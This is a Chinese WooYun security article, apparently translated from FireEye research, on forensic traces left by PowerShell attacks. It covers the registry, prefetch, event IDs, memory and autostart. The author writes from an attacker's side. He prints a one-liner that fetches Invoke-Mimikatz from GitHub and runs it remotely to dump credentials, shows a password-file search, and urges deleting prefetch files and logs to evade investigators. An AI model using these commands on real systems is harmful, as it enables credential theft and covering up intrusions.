@@ -1,0 +1,177 @@
+
+
+  
+
+  
+
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+
+  <article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+    <header>
+      <h1 class="entry-title ng-binding">powershell各种反弹姿势以及取证（二）</h1>
+
+      <div class="entry-meta">
+        <a target="_blank" class="author name ng-binding">
+          mickey</a>
+        <span class="bull">·</span>
+        <time title="2015/05/25 10:17" ui-time="" datetime="2015/05/25 10:17" class="published ng-binding ng-isolate-scope">2015/05/25 10:17</time>
+      </div>
+    </header>
+
+    <!-- ngIf: isCensoring -->
+
+    <section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+      <p>
+        </p><h1>0x00 简介</h1>
+
+<hr>
+
+<p>这篇主要是取证的，如果我以后技术好了，也会写写powershell在内网渗透中的实战应用，本文所有的内容基本翻译自fireEyE的<code>&lt;&lt;Investigating Powershell Attack&gt;&gt;</code>,我英文不好，有好多地方都看不懂他文章里写的，我磕磕碰碰的看完了这篇文章。有不对的地方，还请小伙伴们补充。</p>
+
+<p>我们都知道，从<code>windows 7 sp1</code>和<code>windows server 2008 R2</code>开始，就已经默认安装了powershell(2.0版本)，到了<code>windows Server 2012 R2</code> 和 <code>Window 8.1</code>就是<code>powershell 4.0</code>了。现在用powershell编写的攻击框架也很成熟了，像上文书说的各种协议反弹的SHELL（nishang）；通过<code>dll loading</code>技术不写硬盘的，能远程dump登录账号明文的<code>Mimikatz（PowerSploit）</code>；以及在<code>ShmooCon 2013</code>安全会议上<code>Chris Campbell</code>演示的<code>Powershell Botnet</code>；还有各种搞windows域内网环境的powerview等；<code>SET/METASPLOIT</code>也开始支持powershell版的payloads。我们作为攻击者，也要熟悉现在针对powershell的取证技术，预防自己“艰难进来，轻松被T，却没带走一片云彩”。</p>
+
+<p>原文文章分别从注册表，prefetch,网络流量，内存，日志，自启动这几方面来做取证的。</p>
+
+<!--more-->
+
+<h1>0x01 注册表：</h1>
+
+<hr>
+
+<p>默认情况下，除了WinServer 2012R2 会设置<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell的ExecutionPolicy</code>项为RemoteSigned外，其他的windows系统都会设置为Restricted,有的攻击者为了运行powershell脚本方便，会设置此项为ByPass,但是这种情况并不多见，因为更多的情况是，攻击者使用-ExecuteionPolicy Bypass选项绕过执行策略限制。</p>
+
+<h1>0x02 Prefetch:</h1>
+
+<hr>
+
+<p>Prefetch本意是为了增强系统的性能的，让应用程序下次载入的时候，节省时间。默认路径在<code>%systemroot%\prefetch</code>。取证人员常常会通过这些*.PF文件，获取程序最后运行时间，程序访问的文件列表等信息。取证人员有可能通过查看POWERSHELL.EXE-59FC8F3D.pf获取到你运行的攻击PS脚本信息。我这里用的<a href="http://redwolfcomputerforensics.com/downloads/parse_prefetch_info_v1.4.zip">Prefetch Parser v1.4</a>来查看的，</p>
+
+<p>如图</p>
+
+<p><img alt="enter image description here" img-src="118191573b7ec0093fae5c8d1ca84f1f48d9e35a.jpg"></p>
+
+<p>所以每次我们用完powershell，记得<code>del %systemroot%\prefetch\POWERSHELL.EXE-59FC8F3D.pf</code></p>
+
+<h1>0x03 网络流量：</h1>
+
+<hr>
+
+<p>攻击者做内网渗透时，思路通常是先获取了工作组的administrator权限，然后渗透配置不严格的域环境，开启powershell的remoting功能，powershell 2.0的Remoting默认会走<code>5985(HTTP)</code>和<code>5986(HTTPS)</code>端口，文章里说，主要是监控内网<->内网，DMZ<->内网,VPN<->内网的异常数据流，建模识别出攻击者的非法访问，我想这里能做的，还是要熟悉内网环境，在有正常业务流的内网使用Remoting功能，其他办法我也没想到。</-></-></-></p>
+
+<h1>0x04 内存：</h1>
+
+<hr>
+
+<p>论文作者主要是说可以用<code>Volatility</code>框架分析<code>wsmprovhost.exe</code>进程，能够在内存空间看到XML格式的信息。比如这里他使用<code>PSSesion</code>远程交互式SHELL执行了<code>“echo "helloword" &gt; c:\text.txt”,</code>然后就可以在<code>wsmprovhost.exe</code>的进程里看到信息，如图：</p>
+
+<p><img alt="enter image description here" img-src="226b8dfe2ebcb531988839db2f768f50ed86e3db.jpg"></p>
+
+<p>但是这个方法随着远程会话的中止，也将不再有用，要想成功实现取证，需要攻击者正在操作。所以我感觉这个对我们的威胁不是很大。如果开启了winrm，也有可能在<code>svchost.exe</code>的进程里看到信息。他这里用的是<code>Invoke-Mimikatz</code>做的演示，远程通过下载在内存里执行，DUMP明文密码，不写硬盘，这个渗透技巧实战的时候很有用，命令如下：</p>
+
+<pre><code>#!bash
+Invoke-Command -Computername 192.168.114.133 {iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')); Invoke-Mimikatz -DumpCreds}
+</code></pre>
+
+<p>如下是他在svchost.exe进程内存里抓到的信息</p>
+
+<p><img alt="enter image description here" img-src="74f823167a5b527f419d52d5391aaed7c75fc463.jpg"></p>
+
+<h1>0x05 日志：</h1>
+
+<hr>
+
+<p>Powershell 2.0的默认日志功能还不是很强，powershell 3.0后有所增强，不论是你本地还是通过Remoting执行powershell脚本，都会在下面3个文件里写入日志<code>%systemroot%\System32\winevt\</code></p>
+
+<pre><code>windows powershell.evtx
+</code></pre>
+
+<p>每次powershell开始执行<code>EID 400</code>或者结束<code>EID 403</code>的时候，都会记录。里面的HostName项如果是<code>ConsoleHost</code>说明是从本地执行的，反之，是对方的机器名</p>
+
+<pre><code>Microsoft-Windows-PowerShell%4Operational.evtx
+</code></pre>
+
+<p><code>Microsoft-Windows-power-Shell%4Analytic.etl</code> [我机器上没有找到这个文件]</p>
+
+<p>如果通过WINRM开启了remoting功能，还会有下面2个日志：</p>
+
+<pre><code>Microsoft-Windows-WinRM%4Operational.evtx
+</code></pre>
+
+<p>EID 6会记录remoting的客户端地址信息，在这里可能看到是谁连过来的</p>
+
+<pre><code>Microsoft-Windows-WinRM%4Analytic.etl
+</code></pre>
+
+<p><code>EID 32850</code> 会记录<code>remoting</code>客户端连接过来使用的账号信息 <code>EID 32867/32868</code> 里面有可能会看到当<code>Invoke-Command</code>执行命令的时候的细节，如图</p>
+
+<p><img alt="enter image description here" img-src="4f7f7c5db316777b743c046f7039261764465352.jpg"></p>
+
+<p>另外随着Microsoft APPLocker的引用，管理员能够对powershell脚本进行更进一步的验证，比如允许哪个PS脚本运行，哪个不允许，甚至禁止掉计算机上全部PS脚本的执行权限等操作，但是这些对我们来说都有已知的技术能绕过，我下回书再说。<code>AppLocker</code>功能启用后，<code>EID 8005</code> 和<code>EID 8006</code>会记录认证信息的日志。</p>
+
+<p>作者也提到可以通过<code>%windir%\system32\WindowsPowerShell\v1.0\profile.ps1</code>设置全局的profile,来增加额外的日志记录，他这里说可以用-NoProfile来绕过，上文书我实践过，发现是不可以的，参考上文，这里不多提了。</p>
+
+<p>Powershell 3.0引入了<code>Module Logging</code>的能力，可以通过组策略开启<code>（Computer Configuration → Administrative Templates →Windows Components →Windows PowerShell →Turn on Module Logging）</code>，开启后，可以在EID 4103里看到ps脚本执行后的结果，比如我执行</p>
+
+<pre><code>#!bash
+Get-ChildItem c:\temp -Filter *.txt -Recurse | Select-String password
+</code></pre>
+
+<p>意思是搜索<code>C:\</code>下所有TXT里包含password的文件，可以在<code>EID 4103</code>里看到返回结果，如图</p>
+
+<p><img alt="enter image description here" img-src="036889981005c200f3de7dbf4cec506e05506d4f.jpg"></p>
+
+<p>甚至Invoke-Mimikatz执行的结果也会记录，如图</p>
+
+<p><img alt="enter image description here" img-src="1e66670bf5167dcb25f57d4fde39b95e29e09040.jpg"></p>
+
+<p>再次提醒我们，该删日志，一定要删，外面应该有能删指定日志的工具了，不过我没见到，有的发我一份。</p>
+
+<h1>0x06 自启动：</h1>
+
+<hr>
+
+<p>Powershell经常通过注册表，开始菜单，或者计划任务来实现自启动的目的，通常用sysinternals的autorun就能找到了。另外<code>C:\Users\&lt;USERNAME&gt;\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</code>可以达到和<code>C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1</code>一样的效果。</p>
+
+<p><strong><em>文章参考：</em></strong></p>
+
+<p>https://www.blackhat.com/docs/us-14/materials/us-14-Kazanciyan-Investigating-Powershell-Attacks-WP.pdf</p>
+
+<p>https://www.defcon.org/images/defcon-22/dc-22-presentations/Kazanciyan-Hastings/DEFCON-22-Ryan-Kazanciyan-Matt-Hastings-Investigating-Powershell-Attacks.pdf</p>      <p></p>
+    </section>
+  </article>
+  <!-- collect -->
+  <div class="entry-controls clearfix">
+		<div style="float:left;color:#9d9e9f;font-size:15px">
+			<span>
+				&copy;乌云知识库版权所有 未经许可 禁止转载
+			</span>
+		</div>
+        
+
+      </div>
+
+          
+  <!-- collect end -->
+  <!-- recommend -->
+  <div class="yarpp-related">
+<h3>为您推荐了适合您的技术文章:</h3>
+<ol id="recommandsystem">
+		<li><a href="http://drops.wooyun.org/tips/6090" rel="bookmark" id="re1">powershell各种反弹姿势以及取证（一）</a></li>
+			<li><a href="http://drops.wooyun.org/tips/13079" rel="bookmark" id="re2">域渗透——Hook PasswordChangeNotify</a></li>
+			<li><a href="http://drops.wooyun.org/tips/3353" rel="bookmark" id="re3">Powershell tricks::Bypass AV</a></li>
+			<li><a href="http://drops.wooyun.org/tips/11989" rel="bookmark" id="re4">Powershell 提权框架-Powerup</a></li>
+	 
+</ol>
+</div>
+  <!-- recommend end -->
+  <!-- comment -->
+  <div id="comments" class="comment-list clearfix">
+            
+          <div id="comment-list">
+      </div>
+  </div>
+  <!-- comment end -->
+  
+</div>
+</main>
